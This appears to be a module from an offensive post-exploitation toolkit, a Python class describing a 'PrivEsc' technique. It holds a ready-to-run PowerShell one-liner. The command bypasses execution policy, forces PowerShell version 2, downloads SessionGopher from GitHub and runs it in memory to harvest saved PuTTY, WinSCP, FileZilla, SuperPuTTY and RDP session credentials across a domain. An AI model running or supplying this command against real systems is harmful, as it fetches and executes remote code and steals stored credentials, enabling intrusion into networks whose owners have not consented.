class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and run SessionGopher to get saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP."
    function    = "PrivEsc"
    liner     = "powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1'); Invoke-SessionGopher -AllDomain -o"
